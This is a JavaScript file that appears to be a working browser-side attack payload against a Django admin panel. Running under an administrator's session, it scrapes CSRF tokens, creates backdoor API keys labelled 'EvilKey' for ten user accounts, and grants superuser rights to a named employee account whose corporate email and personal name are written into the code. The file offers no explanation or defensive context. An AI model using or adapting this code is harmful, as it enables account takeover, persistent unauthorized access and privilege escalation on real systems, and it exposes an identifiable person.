async function GetData(url = '', data = {}) {
  const response = await fetch(url, {
    method: 'GET', 
  });
  return await response.text(); 
}

  
  
function find_csrf_api(server_responce) {
  var StartPattern = 'name="csrfmiddlewaretoken" value="';
  var EndPattern = '">\n<div>\n\n\n\n\n\n\n\n  <fieldset class="module aligned ">';
  
  var StartPosition = server_responce.indexOf(StartPattern, 0);
  var EndPosition = server_responce.indexOf(EndPattern, 0);
  
  console.log(StartPosition + StartPattern.length);
  console.log(EndPosition);
  
  if (StartPosition != -1 && EndPosition != -1) {
  console.log("Found!");
  
  var key = server_responce.substring(StartPosition + StartPattern.length, EndPosition);
  console.log(key);
  return key;
  }
}

function find_userID(server_responce) {
  var StartPattern = 'td><th class="field-__str__"><a href="/admin/users/user/';
  var EndPattern = '/change/?_changelist_filters=q%';
  
  var StartPosition = server_responce.indexOf(StartPattern, 0);
  var EndPosition = server_responce.indexOf(EndPattern, 0);
  
  console.log(StartPosition + StartPattern.length);
  console.log(EndPosition);
  
  if (StartPosition != -1 && EndPosition != -1) {
  console.log("Found!");
  
  var key = server_responce.substring(StartPosition + StartPattern.length, EndPosition);
  console.log(key);
  return key;
  }
}

function find_userprofile_id(server_responce) {
  var StartPattern = '<input type="hidden" name="userprofile-0-id" value="';
  var EndPattern = '" id="id_userprofile-0-id">';
  
  var StartPosition = server_responce.indexOf(StartPattern, 0);
  var EndPosition = server_responce.indexOf(EndPattern, 0);
  
  console.log(StartPosition + StartPattern.length);
  console.log(EndPosition);
  
  if (StartPosition != -1 && EndPosition != -1) {
  console.log("Found!");
  
  var key = server_responce.substring(StartPosition + StartPattern.length, EndPosition);
  console.log(key);
  return key;
  }
}

function find_settingsprofile_id(server_responce) {
  var StartPattern = '<input type="hidden" name="settingsprofile-0-id" value="';
  var EndPattern = '" id="id_settingsprofile-0-id">';
  
  var StartPosition = server_responce.indexOf(StartPattern, 0);
  var EndPosition = server_responce.indexOf(EndPattern, 0);
  
  console.log(StartPosition + StartPattern.length);
  console.log(EndPosition);
  
  if (StartPosition != -1 && EndPosition != -1) {
  console.log("Found!");
  
  var key = server_responce.substring(StartPosition + StartPattern.length, EndPosition);
  console.log(key);
  return key;
  }
}



async function CreateKey(url = '', csrf, userID, key) {
send_body = 'csrfmiddlewaretoken=' + csrf + '&user=' + userID + '&key=' + key + '&created_0=01.11.2021&created_1=14%3A55%3A57&initial-created_0=01.11.2021&initial-created_1=14%3A55%3A57&_save=%D0%A1%D0%BE%D1%85%D1%80%D0%B0%D0%BD%D0%B8%D1%82%D1%8C';
  const response = await fetch(url, {
    method: 'POST', // *GET, POST, PUT, DELETE, etc.
    mode: 'cors', // no-cors, *cors, same-origin
    cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
    credentials: 'include', // include, *same-origin, omit
    headers: {
      // 'Content-Type': 'application/json'
       'Content-Type': 'application/x-www-form-urlencoded',
    },
    redirect: 'follow', // manual, *follow, error
    referrer: "/admin/tastypie/apikey/add/",
    body: send_body
  });
  return await response.text(); // parses JSON response into native JavaScript objects
}

async function MakeAdmin(url = '', csrf_token, username, userID, userprofile_id, settingsprofile_id) {
  send_body = 'csrfmiddlewaretoken=' + csrf_token + '&username=' + username + '&email='+ username +'%40tinkoff.ru&first_name=%D0%90%D0%BD%D0%B4%D1%80%D0%B5%D0%B9&last_name=%D0%9A%D0%BE%D1%81%D0%B8%D0%BD%D0%B5%D1%86&gender=1&last_login_0=05.09.2021&last_login_1=17%3A26%3A09&&is_superuser=on&is_active=on&line_manager=&functional_manager=&r_line_manager=&r_functional_manager=&userprofile-TOTAL_FORMS=1&userprofile-INITIAL_FORMS=1&userprofile-MIN_NUM_FORMS=0&userprofile-MAX_NUM_FORMS=1&userprofile-0-birthday=&userprofile-0-mentors=&userprofile-0-recruiter=&userprofile-0-unit=&userprofile-0-appointment=&userprofile-0-r_unit=&userprofile-0-position=&userprofile-0-m_phone=&userprofile-0-w_phone=&userprofile-0-hidden_phone=&userprofile-0-call_if_absent=&userprofile-0-call_center_comment=&userprofile-0-town_live=&userprofile-0-town_birth=&userprofile-0-metro_station=&userprofile-0-start_of_work=&userprofile-0-probation=&userprofile-0-end_of_work=&userprofile-0-to_work=&userprofile-0-biography_ru=&userprofile-0-biography_en=&userprofile-0-comments=&userprofile-0-hobbies=&userprofile-0-email2=&userprofile-0-firstname_eng=&userprofile-0-lastname_eng=&userprofile-0-foot_size=&userprofile-0-clothes_size=&userprofile-0-license=&userprofile-0-patronymic=%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B8%D1%87&userprofile-0-known_as=&userprofile-0-password_last_change_0=&userprofile-0-password_last_change_1=&userprofile-0-specialization=&userprofile-0-moved_to_outsource_at=&userprofile-0-employee_number=&userprofile-0-cfo=&userprofile-0-wallpaper=&userprofile-0-residency_address=&userprofile-0-actual_address=&userprofile-0-alumni_invite_0=&userprofile-0-alumni_invite_1=&userprofile-0-hrbp=&userprofile-0-hrd=&userprofile-0-financial_partners=&userprofile-0-working_format=&userprofile-0-id=' + userprofile_id + '&userprofile-0-user=' + userID + '&userprofile-__prefix__-birthday=&userprofile-__prefix__-mentors=&userprofile-__prefix__-recruiter=&userprofile-__prefix__-unit=&userprofile-__prefix__-appointment=&userprofile-__prefix__-r_unit=&userprofile-__prefix__-position=&userprofile-__prefix__-m_phone=&userprofile-__prefix__-w_phone=&userprofile-__prefix__-hidden_phone=&userprofile-__prefix__-call_if_absent=&userprofile-__prefix__-call_center_comment=&userprofile-__prefix__-town_live=&userprofile-__prefix__-town_birth=&userprofile-__prefix__-metro_station=&userprofile-__prefix__-start_of_work=&userprofile-__prefix__-probation=&userprofile-__prefix__-end_of_work=&userprofile-__prefix__-to_work=&userprofile-__prefix__-biography_ru=&userprofile-__prefix__-biography_en=&userprofile-__prefix__-comments=&userprofile-__prefix__-hobbies=&userprofile-__prefix__-email2=&userprofile-__prefix__-firstname_eng=&userprofile-__prefix__-lastname_eng=&userprofile-__prefix__-foot_size=&userprofile-__prefix__-clothes_size=&userprofile-__prefix__-license=&userprofile-__prefix__-patronymic=&userprofile-__prefix__-known_as=&userprofile-__prefix__-password_last_change_0=&userprofile-__prefix__-password_last_change_1=&userprofile-__prefix__-specialization=&userprofile-__prefix__-moved_to_outsource_at=&userprofile-__prefix__-sap_id=&userprofile-__prefix__-employee_number=&userprofile-__prefix__-cfo=&userprofile-__prefix__-wallpaper=&userprofile-__prefix__-residency_address=&userprofile-__prefix__-actual_address=&userprofile-__prefix__-alumni_invite_0=&userprofile-__prefix__-alumni_invite_1=&userprofile-__prefix__-hrbp=&userprofile-__prefix__-hrd=&userprofile-__prefix__-financial_partners=&userprofile-__prefix__-working_format=&userprofile-__prefix__-id=&userprofile-__prefix__-user=' + userID + '&sapprofiles-TOTAL_FORMS=1&sapprofiles-INITIAL_FORMS=0&sapprofiles-MIN_NUM_FORMS=0&sapprofiles-MAX_NUM_FORMS=1&sapprofiles-0-legal_entity=&sapprofiles-0-number=&sapprofiles-0-start_date=&sapprofiles-0-end_date=&sapprofiles-0-contract_type=&sapprofiles-0-cost_centre=&sapprofiles-0-source_system=&sapprofiles-0-id=&sapprofiles-__prefix__-legal_entity=&sapprofiles-__prefix__-number=&sapprofiles-__prefix__-start_date=&sapprofiles-__prefix__-end_date=&sapprofiles-__prefix__-contract_type=&sapprofiles-__prefix__-cost_centre=&sapprofiles-__prefix__-source_system=&sapprofiles-__prefix__-id=&sapprofiles-__prefix__-user=' + userID + '&settingsprofile-TOTAL_FORMS=1&settingsprofile-INITIAL_FORMS=1&settingsprofile-MIN_NUM_FORMS=0&settingsprofile-MAX_NUM_FORMS=1&settingsprofile-0-show_my_photos=on&settingsprofile-0-show_advice=on&settingsprofile-0-missed_calls_sms=on&settingsprofile-0-birth_pub=on&settingsprofile-0-jubilee_pub=on&settingsprofile-0-calendar_integration=&settingsprofile-0-use_calendar_default=on&settingsprofile-0-show_schedule_in_profile=true&settingsprofile-0-meeting_email_notification=on&settingsprofile-0-meeting_push_notification=on&settingsprofile-0-notify_discount_nc=false&settingsprofile-0-notify_discount_email=true&settingsprofile-0-notify_discount_push=unknown&settingsprofile-0-notify_idea_nc=false&settingsprofile-0-notify_idea_email=true&settingsprofile-0-notify_idea_push=unknown&settingsprofile-0-notify_blog_entry_nc=false&settingsprofile-0-notify_blog_entry_email=true&settingsprofile-0-notify_blog_entry_push=unknown&settingsprofile-0-notify_comment_to_pub_author_nc=true&settingsprofile-0-notify_comment_to_pub_author_email=true&settingsprofile-0-notify_comment_to_pub_author_push=unknown&settingsprofile-0-notify_comments_to_parent_nc=true&settingsprofile-0-notify_comments_to_parent_email=true&settingsprofile-0-notify_comments_to_parent_push=unknown&settingsprofile-0-id=' + settingsprofile_id + '&settingsprofile-0-user=' + userID + '&settingsprofile-__prefix__-show_my_photos=on&settingsprofile-__prefix__-show_advice=on&settingsprofile-__prefix__-missed_calls_sms=on&settingsprofile-__prefix__-birth_pub=on&settingsprofile-__prefix__-jubilee_pub=on&settingsprofile-__prefix__-calendar_integration=&settingsprofile-__prefix__-use_calendar_default=on&settingsprofile-__prefix__-show_schedule_in_profile=true&settingsprofile-__prefix__-meeting_email_notification=on&settingsprofile-__prefix__-meeting_push_notification=on&settingsprofile-__prefix__-notify_discount_nc=false&settingsprofile-__prefix__-notify_discount_email=true&settingsprofile-__prefix__-notify_discount_push=unknown&settingsprofile-__prefix__-notify_idea_nc=false&settingsprofile-__prefix__-notify_idea_email=true&settingsprofile-__prefix__-notify_idea_push=unknown&settingsprofile-__prefix__-notify_blog_entry_nc=false&settingsprofile-__prefix__-notify_blog_entry_email=true&settingsprofile-__prefix__-notify_blog_entry_push=unknown&settingsprofile-__prefix__-notify_comment_to_pub_author_nc=true&settingsprofile-__prefix__-notify_comment_to_pub_author_email=true&settingsprofile-__prefix__-notify_comment_to_pub_author_push=unknown&settingsprofile-__prefix__-notify_comments_to_parent_nc=true&settingsprofile-__prefix__-notify_comments_to_parent_email=true&settingsprofile-__prefix__-notify_comments_to_parent_push=unknown&settingsprofile-__prefix__-id=&settingsprofile-__prefix__-user=' + userID + '&userasset_set-TOTAL_FORMS=1&userasset_set-INITIAL_FORMS=0&userasset_set-MIN_NUM_FORMS=0&userasset_set-MAX_NUM_FORMS=1000&userasset_set-0-id=&userasset_set-0-user=' + userID + '&userasset_set-0-inv_num=&userasset_set-0-name=&userasset_set-0-quantity=&userasset_set-0-source_app=&userasset_set-__prefix__-id=&userasset_set-__prefix__-user=' + userID + '&userasset_set-__prefix__-inv_num=&userasset_set-__prefix__-name=&userasset_set-__prefix__-quantity=&userasset_set-__prefix__-source_app=&_save=%D0%A1%D0%BE%D1%85%D1%80%D0%B0%D0%BD%D0%B8%D1%82%D1%8C';     
  const response = await fetch(url, {
    method: 'POST', // *GET, POST, PUT, DELETE, etc.
    mode: 'cors', // no-cors, *cors, same-origin
    cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
    credentials: 'include', // include, *same-origin, omit
    headers: {
      // 'Content-Type': 'application/json'
       'Content-Type': 'application/x-www-form-urlencoded',
    },
    redirect: 'follow', // manual, *follow, error
    referrer: "/admin/users/user/",
    body: send_body
  });
  return await response.text(); // parses JSON response into native JavaScript objects
}

GetData('/admin/tastypie/apikey/add')
  .then((data) => {
    console.log(data); 
    csrf_token = find_csrf_api(data);
    CreateKey('/admin/tastypie/apikey/add/', csrf_token, '1', 'EvilKey');
    CreateKey('/admin/tastypie/apikey/add/', csrf_token, '2', 'EvilKey');
    CreateKey('/admin/tastypie/apikey/add/', csrf_token, '3', 'EvilKey');
    CreateKey('/admin/tastypie/apikey/add/', csrf_token, '4', 'EvilKey');
    CreateKey('/admin/tastypie/apikey/add/', csrf_token, '5', 'EvilKey');
    CreateKey('/admin/tastypie/apikey/add/', csrf_token, '6', 'EvilKey');
    CreateKey('/admin/tastypie/apikey/add/', csrf_token, '7', 'EvilKey');
    CreateKey('/admin/tastypie/apikey/add/', csrf_token, '8', 'EvilKey');
    CreateKey('/admin/tastypie/apikey/add/', csrf_token, '9', 'EvilKey');
    CreateKey('/admin/tastypie/apikey/add/', csrf_token, '10', 'EvilKey');
  });
  
username='a.kosinets';

GetData('/admin/users/user/?q=' + username)
  .then((data) => {
    console.log(data); 
    userID = find_userID(data);
    url = '/admin/users/user/' + userID + '/change/';
    console.log(url);
    GetData(url)
      .then((data) => {
        console.log(data); 
        csrf_token = find_csrf_api(data);
        userprofile_id = find_userprofile_id(data);
        settingsprofile_id = find_settingsprofile_id(data); 
        console.log(userID, userprofile_id, settingsprofile_id);
        MakeAdmin(url, csrf_token, username, userID, userprofile_id, settingsprofile_id) 
        console.log('ok');
          });
  });